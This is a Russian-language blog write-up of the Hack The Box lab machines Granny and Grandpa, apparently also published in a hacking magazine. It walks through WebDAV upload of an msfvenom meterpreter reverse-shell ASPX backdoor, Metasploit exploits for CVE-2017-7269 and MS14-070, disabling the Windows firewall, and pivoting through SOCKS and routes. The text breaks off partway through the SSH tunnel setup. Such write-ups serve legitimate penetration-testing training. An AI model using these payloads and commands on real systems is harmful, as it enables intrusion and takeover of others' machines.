---
layout: post
title: "HTB{ Granny💔Grandpa }"
date: 2020-01-26 22:00:00 +0300
author: snovvcrash
tags: [xakep-ru, hackmag-com, write-up, hackthebox, machine, windows, webdav, davtest, burp, msfvenom, metasploit, upload-asp, cve-2017-7269, scstoragepathfromurl, ms14-070, tcpip-ioctl, pivoting, port-forwarding, msf-route, msf-socks, proxychains-ng, ssh-reverse-tcp, plink, msf-portfwd, msf-hashdump, lmhash-nthash, pass-the-hash, impacket, psexec-py]
---

[//]: # (2019-12-26)

На заре становления Hack The Box как онлайн-площадки для тренировки вайтхетов в списке машин ее лаборатории значились две виртуалки: **Grandpa** и **Granny**. Обе эти машины нацелены на эксплуатацию уязвимостей WebDAV (набора дополнений для HTTP), и стратегии захвата их root-флагов практически не отличаются друг от друга. Поэтому, чтобы разнообразить прохождения, мы сначала быстро рассмотрим, как можно взломать каждый из хостов по отдельности, а после этого превратим один из них в шлюз, через который атакуем второй хост. Умение пользоваться техникой Pivoting — проброса трафика к жертве (и обратно) через промежуточные хосты — жизненно важный скил для этичного хакера, который пригодится при тестировании на проникновение любой корпоративной сетки.

<!--cut-->

* TOC
{:toc}

[*Приложения*](https://github.com/snovvcrash/xakep-ru/tree/master/htb-grandparents)

# Granny

Первой мы будем проходить виртуалку Granny. Эта машина достаточно проста (рейтинг сложности — 3,4 балла из 10), однако, как по мне, она максимально приближена к случаям из реальной жизни (по крайней мере, там, где не следят за обновлением ПО). Не даром именно такие тачки часто попадаются на сертификации OSCP в лайтовой ценовой категории.

<p align="right">
  <a href="https://hackmag.com/security/htb-pivoting"><img src="https://img.shields.io/badge/F-HackMag-26a0c4?style=flat-square" alt="hackmag-badge.svg" /></a>
  <a href="https://xakep.ru/2019/12/26/htb-pivoting/"><img src="https://img.shields.io/badge/%5d%5b-%d0%a5%d0%b0%d0%ba%d0%b5%d1%80-red?style=flat-square" alt="xakep-badge.svg" /></a>
  <a href="https://www.hackthebox.eu/home/machines/profile/14"><img src="https://img.shields.io/badge/%e2%98%90-Hack%20The%20Box-8ac53e?style=flat-square" alt="htb-badge.svg" /></a>
  <span class="score-easy">3.4/10</span>
</p>

![granny-banner.png](/assets/images/htb/machines/grandparents/granny-banner.png)
{:.center-image}

![granny-info.png](/assets/images/htb/machines/grandparents/granny-info.png)
{:.center-image}

## Разведка

Для начала сканируем порты и исследуем найденные сервисы.

### Nmap

Сканирование Nmap я провожу в два этапа: поверхностное (только SYN-пакеты, без скриптов) и точечное по найденным портам (с задействованием скриптового движка NSE и определением версий сервисов).

```
root@kali:~# nmap -n -Pn -oA nmap/granny-initial 10.10.10.15
root@kali:~# cat nmap/granny-initial.nmap
...
Host is up (0.065s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
...
```

По окончании видим только один открытый порт — 80-й, веб. Узнаем подробнее, кто там живет.

```
root@kali:~# nmap -n -Pn -sV -sC -oA nmap/granny-version 10.10.10.15 -p80
root@kali:~# cat nmap/granny-version.nmap
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Server Date: Sat, 21 Dec 2019 18:04:11 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
...
```

Итак, что у нас есть? Веб-сервер Microsoft IIS, версия 6.0. Если спросить Google, что он знает об этой ревизии IIS, то он сдаст «мелкомягких» с потрохами: Windows Server 2003.

[![google-iis-version.png](/assets/images/htb/machines/grandparents/google-iis-version.png)](/assets/images/htb/machines/grandparents/google-iis-version.png)
{:.center-image}

Информации об архитектуре Windows у нас нет, поэтому пока будем считать, что это x86, ибо они были более распространены в свое время. Также скрипт `http-webdav-scan.nse` оповестил нас об установленном наборе HTTP-расширений [WebDAV](https://xakep.ru/2014/09/09/webdav/). В общем, все намекает на то, что нам суждено отправиться на исследование веба.

Если параметры, передаваемые сканеру, кажутся неочевидными, рекомендую обратиться [к прохождению](/2019/09/20/htb-ctf.html#nmap) машины CTF — там они описаны более подробно.

## Веб

Заглянем за завесу 80-го порта с разных углов: от простого браузера до специальных утилит для работы с WebDAV.

### Общие сведения

На главной странице веб-сервера (`http://10.10.10.15/`) — заглушка.

[![web-granny-main-page.png](/assets/images/htb/machines/grandparents/web-granny-main-page.png)](/assets/images/htb/machines/grandparents/web-granny-main-page.png)
{:.center-image}

Браузер оказался немногословен, поэтому постараемся расширить список наших знаний о системе заголовками HTTP-хедеров.

```
root@kali:~# curl -I 10.10.10.15
HTTP/1.1 200 OK
Content-Length: 1433
Content-Type: text/html
Content-Location: http://10.10.10.15/iisstart.htm
Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT
Accept-Ranges: bytes
ETag: "05b3daec0d9c21:348"
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Date: Sat, 21 Dec 2019 21:51:01 GMT
```

В заголовках ожидаемо присутствует информация о том, что используется ASP.NET. Держи в голове две базовые схемы, когда речь заходит о стеке технологий веб-разработки:

* LAMP = **L**inux + **A**pache + **M**ySQL + **P**HP
* WISA = **W**indows + **I**IS + **S**QL Server + **A**SP.NET

В нашем случае, так как речь идет о Windows, платформа ASP.NET выступает в роли альтернативы PHP. А это значит, что именно этот компонент стека будет средой для создания полезной нагрузки бекдора, и было бы неплохо найти способ доставки на сервер файлов с расширением asp/aspx.

### WebDAV

Надстройки WebDAV привносят [дополнительные методы](https://ru.wikipedia.org/wiki/WebDAV#Методы) в дефолтный набор HTTP-запросов. Один из них — метод `MOVE`, который позволяет перемещать (грубо говоря, переименовывать) файлы на сервере. Идея нашего злодеяния довольно проста: загрузить на веб-сервер легитимный файл и переименовать его в исполняемый, изменив расширение на asp или aspx. Таким образом, мы обойдем черный список из типов файлов, которые нельзя было загрузить изначально. Эта уловка стара как мир, а в основе ее лежит небезопасная настройка веб-сервера ([OSVDB-397](https://vulners.com/osvdb/OSVDB:397)), доверяющая метод `PUT` кому угодно.

Я воспользовался нотацией OSVDB для классификации угрозы безопасности. OSVDB (Open Sourced Vulnerability Database) — опенсорсная база данных уязвимостей, которая в апреле 2016 года прекратила свое существование. Однако здесь нам на помощь пришел агрегатор ИБ-контента Vulners, который впитал в себя, в частности, и эту базу данных. Подробнее почитать о нем можно [здесь](https://xakep.ru/2016/07/08/vulners/).

Для взаимодействия с WebDAV есть несколько удобных инструментов командной строки, которыми мы и воспользуемся.

Сначала исследуем состояние безопасности с помощью `davtest`. К сожалению, эта утилита не позволяет указать прокси-сервер, чтобы посмотреть, какие именно запросы были отправлены, поэтому мы пойдем на хитрость: запустим Burp Suite, перейдем на вкладку Proxy → Options и добавим еще один листенер `10.10.10.15:80` на интерфейс loopback.

[![burp-proxy-settings.png](/assets/images/htb/machines/grandparents/burp-proxy-settings.png)](/assets/images/htb/machines/grandparents/burp-proxy-settings.png)
{:.center-image}

Теперь я могу натравить `davtest` на localhost точно так же, как на `10.10.10.15`, и все запросы полетят через проксю Burp.

```
root@kali:~# davtest -rand evilhacker -url localhost
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                localhost
********************************************************
NOTE    Random string for this session: evilhacker
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     aspx    FAIL
PUT     php     FAIL
PUT     cgi     FAIL
PUT     jhtml   FAIL
PUT     html    FAIL
PUT     asp     FAIL
PUT     txt     FAIL
PUT     cfm     FAIL
PUT     pl      FAIL
PUT     shtml   FAIL
PUT     jsp     FAIL

********************************************************
```

Несмотря на то, что по мнению `davtest` все попытки загрузить какой-либо файл на сервер провалились, мы можем открыть историю Burp и посмотреть, что же на самом деле произошло.

[![burp-http-history.png](/assets/images/htb/machines/grandparents/burp-http-history.png)](/assets/images/htb/machines/grandparents/burp-http-history.png)
{:.center-image}

Как видно из скриншота, разные запросы `PUT` получили разные ответы веб-сервера:

* при попытке загрузить файл с расширением aspx — категорический запрет (403);
* для файлов .asp, .cgi, .shtml — неопределенное поведение (404, не уверен, почему IIS выбрал именно эту ошибку);
* для всего остального — конфликт загрузки (409).

Последняя ошибка привлекла мое внимание, потому что встречается она не так часто и связана в основном с конфликтами версий загружаемого и уже существующего на сервере файлов.

«Этой ошибке здесь не место», — подумал я и посмотрел внимательнее на тело запроса загрузки простого текстового файла.

```
PUT /localhost/davtest_evilhacker.txt HTTP/1.1
TE: deflate,gzip;q=0.3
Connection: close
Host: localhost:80
User-Agent: DAV.pm/v0.49
Content-Length: 19

TXT put via davtest
```

Вся проблема в том, что `davtest` попытался загрузить эти файлы в несуществующий каталог `/localhost`. Еще раз открыв историю HTTP, я увидел запрос `MKCOL` на создание директории, который также провалился с ошибкой 409. Выглядел он так.

```
MKCOL /localhost/DavTestDir_evilhacker/ HTTP/1.1
TE: deflate,gzip;q=0.3
Connection: close
Host: localhost:80
User-Agent: DAV.pm/v0.49
Content-Length: 0
```

Как нетрудно догадаться, проблема заключается в попытке создать вложенный каталог `/DavTestDir_evilhacker` внутри несуществущего родителя `/localhost`. Не знаю, умеет ли так делать WebDAV в принципе (спецификацию было смотреть лень, может в комменатриях подскажут), но если попробовать создать одноуровневую директорию `/localhost`, она успешно появится, и все встанет на свои места.

[![burp-mkcol.png](/assets/images/htb/machines/grandparents/burp-mkcol.png)](/assets/images/htb/machines/grandparents/burp-mkcol.png)
{:.center-image}

[![burp-put.png](/assets/images/htb/machines/grandparents/burp-put.png)](/assets/images/htb/machines/grandparents/burp-put.png)
{:.center-image}

После этого текстовый файл успешно загрузился, а это означает, что наш план в силе, и можно приступать к генерации полезной нагрузки.

## Шелл от имени NT AUTHORITY\NETWORK SERVICE

Теперь у тебя есть несколько вариантов выбора полезной нагрузки, и все зависит только от конечной цели твоего проникновения в систему.

* Например, если ты точно знаешь, где лежит то, что тебе нужно, и что для доступа хватит базовых привилегий в системе, то можно ограничиться простым [веб-шеллом](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx), взаимодействовать с которым можно прямо из браузера.
* Если же тебе нужно внимательнее осмотреться на хосте, тогда твоим выбором может стать тот же самый веб-шелл в связке [с пейлоадом](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell) на PowerShell, что в конечном итоге дарует тебе реверс-шелл. Далее можно будет проанализировать вывод `systeminfo` с помощью какого-нибудь локального [suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)'а для Windows.
* Ну а если твоя цель — полный захват контроля над тачкой с эскалацией привилегий до админа, тогда meterpreter — твой путь.

Конечно, мы выберем последний вариант.

### Генерация пейлоада

С помощью `msfvenom` создадим бекдор с полезной нагрузкой meterpreter для 32-битной версии Windows в формате `aspx`.

```
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform win LHOST=10.10.14.10 LPORT=31337 -f aspx > meterpreter/m.aspx
```

Далее я создам скрипт автозапуска слушателя Metasploit, чтобы не вводить команды каждый раз вручную в консоли MSF.

```
# meterpreter/l.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 31337
set ExitOnSession false
exploit -j -z
```

### cadaver

В Kali есть инструмент с жутковатым названием cadaver (то есть «труп») — это консольный WebDAV-клиент, который облегчает взаимодействие с WebDAV из командной строки.

Я копирую сгенерированный в `msfvenom` бекдор в текстовый файл `m.txt`, загружу его на сервер и переименую в `m.aspx` в интерактивной сессии `cadaver`.

```
root@kali:~# cp meterpreter/m.aspx m.txt
root@kali:~# cadaver http://10.10.10.15
dav:/> put m.txt
dav:/> move m.txt m.aspx
```

[![cadaver.png](/assets/images/htb/machines/grandparents/cadaver.png)](/assets/images/htb/machines/grandparents/cadaver.png)
{:.center-image}

Теперь можно поднимать слушателя Metasploit и запускать сам файл `m.aspx` на сервере (просто обратиться к нему из браузера).

```
root@kali:~# msfconsole -qr meterpreter/l.rc
```

[![msf-granny-launch-listener.png](/assets/images/htb/machines/grandparents/msf-granny-launch-listener.png)](/assets/images/htb/machines/grandparents/msf-granny-launch-listener.png)
{:.center-image}

И вот у нас уже есть сессия meterpreter от имени NT AUTHORITY\NETWORK SERVICE.

К слову, все это можно было проделать одним кликом — с помощью модуля `exploit/windows/iis/iis_webdav_upload_asp` для Metasploit, который автоматизирует весь процесс.

## Шелл от имени NT AUTHORITY\SYSTEM

Далее дело техники: запустим советчик по локальным уязвимостям и выберем наугад первый попавшийся эксплоит — благо, тачка старая и выбор велик.

[![msf-granny-exploit-suggester.png](/assets/images/htb/machines/grandparents/msf-granny-exploit-suggester.png)](/assets/images/htb/machines/grandparents/msf-granny-exploit-suggester.png)
{:.center-image}

После минутного ожидания 29 уязвимостей были проверены, и 7 из них подошли с высокой вероятностью.

[![msf-granny-privesc.png](/assets/images/htb/machines/grandparents/msf-granny-privesc.png)](/assets/images/htb/machines/grandparents/msf-granny-privesc.png)
{:.center-image}

Я выбрал [MS14-070](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-070) — уязвимость виндового стека TCP/IP. Повышение привилегий с помощью Metasploit заняло считанные секунды, и я получил привилегированный шелл.

Магия Metasploit — это, конечно, круто, однако за кажущейся простотой часто скрываются довольно нетривиальные пассы с WinAPI. Например, на форуме Hack The Box люди часто [практикуются](https://forum.hackthebox.eu/discussion/456/granny-privesc-ms14-070-without-meterpreter) с повышением привилегий без помощи meterpreter.

Если заспавнить шелл и спросить `whoami`, сервер ответит, что ты все еще обладаешь правами не выше NETWORK SERVICE. Происходит это из-за того, что пейлоад meterpreter все еще инжектирован в первый процесс, который мы заарканили до повышения привилегий. Для того, чтобы получить права SYSTEM из оболочки cmd, достаточно мигрировать вредоносный процесс в процесс с соответствующими привилегиями.

[![msf-granny-shell-whoami-fail.png](/assets/images/htb/machines/grandparents/msf-granny-shell-whoami-fail.png)](/assets/images/htb/machines/grandparents/msf-granny-shell-whoami-fail.png)
{:.center-image}

Я выбрал `cidaemon.exe` с PID `3964` в качестве носителя и подселился к нему.

[![msf-granny-migrate.png](/assets/images/htb/machines/grandparents/msf-granny-migrate.png)](/assets/images/htb/machines/grandparents/msf-granny-migrate.png)
{:.center-image}

Теперь права отображаются корректно.

[![msf-granny-shell-whoami-success.png](/assets/images/htb/machines/grandparents/msf-granny-shell-whoami-success.png)](/assets/images/htb/machines/grandparents/msf-granny-shell-whoami-success.png)
{:.center-image}

Дело за малым: найти и вытащить хеши (флаги) юзера и администратора. Сделаю я это с помощью meterpreter — а именно модулей `search` и `download`.

[![msf-granny-get-hashes.png](/assets/images/htb/machines/grandparents/msf-granny-get-hashes.png)](/assets/images/htb/machines/grandparents/msf-granny-get-hashes.png)
{:.center-image}

Напоследок, посмотрим на разрядность ОС.

```
meterpreter > sysinfo
Computer        : GRANNY
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
```

Судя по сведениям `sysinfo`, наше предположение о 32-битной природе Windows подтвердилось.

На этом виртуалку Granny считаю пройденной.

![granny-trophy.png](/assets/images/htb/machines/grandparents/granny-trophy.png)
{:.center-image}

Переходим к Grandpa.

# Grandpa

Эту тачку (рейтинг сложности — 4,5 баллов из 10) я пробегу быстрее и не буду так подробно останавливаться на каждом пункте.

<p align="right">
  <a href="https://www.hackthebox.eu/home/machines/profile/13"><img src="https://img.shields.io/badge/%e2%98%90-Hack%20The%20Box-8ac53e?style=flat-square" alt="htb-badge.svg" /></a>
  <span class="score-easy">4.5/10</span>
</p>

![grandpa-banner.png](/assets/images/htb/machines/grandparents/grandpa-banner.png)
{:.center-image}

![grandpa-info.png](/assets/images/htb/machines/grandparents/grandpa-info.png)
{:.center-image}

## Разведка

### Nmap

Так же в два этапа проведем сканирование Nmap.

```
root@kali:~# nmap -n -Pn -oA nmap/grandpa-initial 10.10.10.14
root@kali:~# cat nmap/grandpa-initial.nmap
...
Host is up (0.064s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
...
```

Результаты повторяются точь-в-точь.

```
root@kali:~# nmap -n -Pn -sV -sC -oA nmap/grandpa-version 10.10.10.14 -p80
root@kali:~# cat nmap/grandpa-version.nmap
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Server Date: Sat, 21 Dec 2019 16:49:20 GMT
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
...
```

## Веб

На главной веб-сайта висит такая же заглушка.

[![web-grandpa-main-page.png](/assets/images/htb/machines/grandparents/web-grandpa-main-page.png)](/assets/images/htb/machines/grandparents/web-grandpa-main-page.png)
{:.center-image}

### WebDAV

Единственное существенное отличие между двумя тачками, пожалуй, в типах брешей WebDAV. На этой машине доступ к загрузке файлов на сервер с помощью `PUT` запрещен для любых типов файлов. Однако, помня о номере версии IIS, я воспользовался [нашумевшим](https://threatpost.ru/publicly-attacked-microsoft-iis-zero-day-unlikely-to-be-patched/21241/) в свое время эксплоитом для [CVE-2017-7269](https://nvd.nist.gov/vuln/detail/CVE-2017-7269). Основывается он на ошибке функции `ScStoragePathFromUrl`, которая содержит уязвимость переполнения буфера в строке одного из хедеров запроса `PROPFIND` (из арсенала WebDAV).

Оригинальный PoC [доступен](https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py) на GitHub, однако я пользовался встроенным модулем Metasploit — `iis_webdav_scstoragepathfromurl`.

[![msf-grandpa-scstoragepathfromurl.png](/assets/images/htb/machines/grandparents/msf-grandpa-scstoragepathfromurl.png)](/assets/images/htb/machines/grandparents/msf-grandpa-scstoragepathfromurl.png)
{:.center-image}

После получения сессии meterpreter ты можешь столкнуться с ошибкой прав доступа. Причины возникновения этого бага схожи с теми, что мы наблюдали в аналогичной ситуации при прохождении Granny: пейлоду тесно в процессе, в котором он сидит.

Чтобы выйти из этого положения, я снова вызову Process List и мигрирую в тот процесс, который обладает нужными мне полномочиями.

[![msf-grandpa-migrate.png](/assets/images/htb/machines/grandparents/msf-grandpa-migrate.png)](/assets/images/htb/machines/grandparents/msf-grandpa-migrate.png)
{:.center-image}

Кстати, для того, чтобы узнать, в какой процесс был проведен первичный инжект, можно воспользоваться командой `netstat` до миграции и посмотреть список активных сетевых соединений.

```
C:\windows\system32\inetsrv>netstat -vb
```

[![msf-grandpa-shell-netstat.png](/assets/images/htb/machines/grandparents/msf-grandpa-shell-netstat.png)](/assets/images/htb/machines/grandparents/msf-grandpa-shell-netstat.png)
{:.center-image}

### Эскалация привилегий

Здесь все идентично предыдущей тачки: для повышение привилегий я буду использовать тот же сплоит.

[![msf-grandpa-exploit-suggester.png](/assets/images/htb/machines/grandparents/msf-grandpa-exploit-suggester.png)](/assets/images/htb/machines/grandparents/msf-grandpa-exploit-suggester.png)
{:.center-image}

Для порядка я запустил поиск локальных уязвимостей, и список оказался точно таким же как и у виртуалки Granny.

[![msf-grandpa-privesc.png](/assets/images/htb/machines/grandparents/msf-grandpa-privesc.png)](/assets/images/htb/machines/grandparents/msf-grandpa-privesc.png)
{:.center-image}

Выбрали `ms14_070_tcpip_ioctl`, повысили привилегии и получили свою сессию.

[![msf-grandpa-get-hashes.png](/assets/images/htb/machines/grandparents/msf-grandpa-get-hashes.png)](/assets/images/htb/machines/grandparents/msf-grandpa-get-hashes.png)
{:.center-image}

Забираем награду, и Grandpa пройден!

![grandpa-trophy.png](/assets/images/htb/machines/grandparents/grandpa-trophy.png)
{:.center-image}

# Pivoting

Ну а теперь, собственно, то, ради чего мы сегодня собрались! Я продемонстрирую некоторые базовые принципы проброса соединений с помощью Metasploit.

Обозначим условия задачи. Дано:

1. Локальная ВМ атакующего с Kali Linux (IP: `10.10.14.30`), которая имеет прямой доступ к ВМ Granny (IP: `10.10.10.15`).
2. ВМ Granny, которая имеет прямой доступ к ВМ Grandpa (IP: `10.10.10.14`).
3. У ВМ атакующего нет прямого доступа к ВМ Grandpa — входящие и исходящие соединения блокируются с помощью `iptables`.

Требуется:

1. Установить соединение между ВМ атакующего и ВМ Grandpa для сторонних утилит (**вне контекста** сессии Metasploit).
2. Установить соединение между ВМ атакующего и ВМ Grandpa **в контексте** сессии Metasploit и получить максимальные права на хосте Grandpa.

Решение...

## Подготовка

Я буду использовать стандартный файрвол для Linux `iptables`, чтобы исключить прямое взаимодействие своего хоста и хоста Grandpa. Так я буду уверен, что правила игры и правда выполняются.

```
root@kali:~# iptables -A OUTPUT -d 10.10.10.14 -j DROP
root@kali:~# iptables -A INPUT -s 10.10.10.14 -j DROP
```

[![iptables-drop-grandpa-out.gif](/assets/images/htb/machines/grandparents/iptables-drop-grandpa-out.gif)](/assets/images/htb/machines/grandparents/iptables-drop-grandpa-out.gif)
{:.center-image}

Упрощенно схему подключения к скрытому за VPN сегменту (виртуальной) сети лаборатории Hack The Box можно изобразить так.

[![network-htb.png](/assets/images/htb/machines/grandparents/network-htb.png)](/assets/images/htb/machines/grandparents/network-htb.png)
{:.center-image}

Однако в рамках нашей задачи лучше абстрагироваться и представить схему взаимодействия «Атакующий-Pivot-Grandpa» в следующем виде.

[![network-pivot-basic.png](/assets/images/htb/machines/grandparents/network-pivot-basic.png)](/assets/images/htb/machines/grandparents/network-pivot-basic.png)
{:.center-image}

Слева — атакующий (ВМ Kali), посередине — ВМ Granny, справа — жертва (ВМ Grandpa). «Общение» напрямую между атакующим и жертвой исключено. Единственный способ взаимодействия — посредством промежуточного хоста.

## Точка опоры

Хост посередине — а именно Granny — будем называть «точкой опоры» или «опорным пунктом» (англ. [foothold](https://www.offensive-security.com/metasploit-unleashed/pivoting/)). Через него будет проходить передача трафика до Grandpa и обратно. Первым делом получим доступ к точке опоры, как мы это делали ранее.

Я написал скрипт автозапуска для Metasploit, чтобы в случае, если что-то пойдет не так, и нужно будет перезапускать всю эту конструкцию, мне не пришлось бы заново вручную вводить команды.

```
# pivot.rc

use auxiliary/server/socks4a
set SRVPORT 9050
run -j

use exploit/windows/iis/iis_webdav_upload_asp
set LHOST tun0
set RHOST 10.10.10.15
set InitialAutoRunScript migrate -f
exploit -j

back
```

В первом блоке я поднимаю прокси-сервер на локальном порту `9050`, а во втором — использую модуль `iis_webdav_upload_asp` для получения низкопривилегированной сессии meterpreter и сразу же мигрирую в другой процесс, чтобы не словить ошибку нехватки токенов (прав доступа).

```
root@kali:~# msfconsole -qr pivot.rc
```

[![msf-pivot-granny-iis-webdav-upload-asp.png](/assets/images/htb/machines/grandparents/msf-pivot-granny-iis-webdav-upload-asp.png)](/assets/images/htb/machines/grandparents/msf-pivot-granny-iis-webdav-upload-asp.png)
{:.center-image}

После этого с помощью команды `route add` я добавляю правило маршрутизации для открытой сессии meterpreter (сессия 1).

```
msf5 > route add 10.10.10.14/32 1
[*] Route added
```

Здесь через слеш я указываю маску подсети `255.255.255.255` (в нотации бесклассовой адресации — [CIDR](https://ru.wikipedia.org/wiki/Бесклассовая_адресаця)), чтобы ассоциировать с этим правилом только один хост — Grandpa (`10.10.10.14`).

Предварительные настройки завершены, в чем можно убедиться с помощью команд `jobs` и `route`.

```
msf5 > jobs
msf5 > route
```

[![msf-jobs-route.png](/assets/images/htb/machines/grandparents/msf-jobs-route.png)](/assets/images/htb/machines/grandparents/msf-jobs-route.png)
{:.center-image}

Первая команда покажет все процессы, которые запущены на фоне Metasploit (видим наш SOCKS-сервер), а вторая выведет список активных правил маршрутизации.

## SOCKS-сервер с помощью Metasploit

Несмотря на то, что сканирование портов можно провести средствами Metasploit (с настроенной там маршрутизацией), существует много других случаев, когда необходимо пользоваться сторонними инструментами для анализа целевой машины. В этом нам и подыграет настроенный в предыдущем параграфе сервер SOCKS, через который с помощью `proxychains` можно расшаривать трафик для внешних утилит.

Недавно в Metasploit добавилась поддержка 5-й версии протокола SOCKS, однако, как бывает со всеми новыми фичами, в ней еще полно [багов](https://github.com/rapid7/metasploit-framework/issues/11513). Но это не повод расстраиваться, ведь версия 4a умеет практически все то же самое (за исключением, разве что, поддержки аутентификации), в том числе и резолвить DNS-имена в IP. В сочетании с модулем `route` это дает прекрасную возможность [использовать](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/manage/autoroute.md#combined-with-default-route) скомпрометированный хост в качестве обычного прокси для браузера и таким образом серфить Интернет от имени жертвы.

Я установлю [proxychains-ng](https://github.com/rofl0r/proxychains-ng) (четвертая версия), так как она всегда казалась мне более стабильной, и запущу сканирование Nmap через SOCKS-прокси.

```
root@kali:~# apt install proxychains4
root@kali:~# proxychains4 nmap -n -v -Pn -sT 10.10.10.14 -p80
```

[![nmap-grandpa-proxychains-web.png](/assets/images/htb/machines/grandparents/nmap-grandpa-proxychains-web.png)](/assets/images/htb/machines/grandparents/nmap-grandpa-proxychains-web.png)
{:.center-image}

Можно убедиться, что 80-й порт на хосте Grandpa открыт.

К сожалению, возможности Nmap весьма ограничены в случае использования сквозь `proxychains` (нет поддержки тихого SYN-сканирования, потому что `proxychains` не понимает крафтовые пакеты, нет определения версий сервисов, да и скорость оставляет желать лучшего), однако это всего лишь пример, и точно так же можно использовать большинство других утилит.

Настройки `proxychains-ng` находятся в файле `/etc/proxychains4.conf`. Там можно изменить номер порта, где расположилась прокся (мы использовали дефолтный `9050`).

На этом этапе нашу воображаемую схему можно дополнить пометками об использовании SOCKS-сервера и маршрутов Metasploit.

[![network-pivot-route-and-socks.png](/assets/images/htb/machines/grandparents/network-pivot-route-and-socks.png)](/assets/images/htb/machines/grandparents/network-pivot-route-and-socks.png)
{:.center-image}

## Реверсивный SSH-туннель

Чтобы у Grandpa тоже была возможность установить соединения с нашим хостом, мы должны настроить соответствующую маршрутизацию через foothold. Из-за того, что я искусственно дропаю трафик между собой и Grandpa, последний не может до меня достучаться (равно как и ответить я ему не тоже могу), и нам необходимо проложить эту часть моста коммуникаций вручную. Сделать это можно с помощью SSH-туннеля от точки опоры до машины атакующего.

«Почему бы в таком случае просто не использовать `bind_tcp` вместо дефолтного `reverse_tcp` и не заморачиваться с каким-то там SSH?» — можешь поинтересоваться ты. Действительно, так сделать можно, однако обратные подключения всегда являеются более предпочтительным вариантом: они надежнее с точки зрения безопасности (к bind-шеллу может подключиться кто угодно), а файрволы чаще ругаются именно на подозрительные **входящие** соединения...

В последней ревизии Metasploit модуль `portfwd` (из состава meterpreter) обзавелся опцией `-R`, которая в теории позволяет конфигурировать обратный проброс порта с жертвы на машину хакера. Таким способом тоже можно было бы настроить прием данных от Granny, однако в рамках этого кейса у меня не получилось это сделать: `portfwd` отказывался создавать релей, ругаясь именно на флаг `-R`.

Если бы на ВМ Granny был установлен PowerShell, лучшим решением было бы [развернуть SSH-сервер именно там](https://habr.com/ru/post/453676/) и подключаться к SSH с клиента Kali, указывая при этом опцию `-R` (Remote SSH Tunneling). Но, к сожалению, pwsh'а на промежуточном хосте не оказалось, поэтому в роли сервера вынуждена была выступить машина атакующего.

### Отключаем файрвол

Чтобы пробросить SSH-туннель c Granny до Kali, сперва придется отключить файрвол на Windows Server. Сделать это можно только с привилегиями админа, поэтому мне пришлось снова воспользоваться MS14-070.

[![msf-pivot-granny-privesc.png](/assets/images/htb/machines/grandparents/msf-pivot-granny-privesc.png)](/assets/images/htb/machines/grandparents/msf-pivot-granny-privesc.png)
{:.center-image}

Теперь можно спавнить шелл и делать все, что душе угодно.

```
C:\WINDOWS\system32>netsh firewall set opmode disable
netsh firewall set opmode disable
Ok.
```

### PuTTY из консоли

Создавать туннель будем с помощью консольного SSH-клиента для Windows — Plink (аналог PuTTY для командной строки). Его можно [скачать](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) или просто найти в Kali, в разделе готовых бинарей для винды.

```
root@kali:~# locate plink.exe
/usr/share/windows-resources/binaries/plink.exe
```

Забросим Plink на Windows Server с помощью meterpreter. Я выбрал директорию, которая априори доступна для записи — `C:\Inetpub\wwwroot`.

```
meterpreter > upload plink.exe "c:\inetpub\wwwroot"
[*] uploading  : plink.exe -> c:\inetpub\wwwroot
[*] uploaded   : plink.exe -> c:\inetpub\wwwroot\plink.exe
```

Теперь создадим вспомогательного пользователя `snovvcrash` на своей машине (чтобы не поднимать туннель от имени root), зададим для него пароль `qwe123` и стартуем SSH-сервер.

```
root@kali:~# useradd snovvcrash
root@kali:~# passwd snovvcrash
New password: qwe123
Retype new password: qwe123
passwd: password updated successfully
root@kali:~# service ssh start
```

Еще я лишу этого пользователя возможности выполнять команды, изменив дефолтный шелл на `/bin/false` в файле `/etc/passwd`. Выполнять команды ему не за чем, а вот безопасность схемы от этого только повысится.

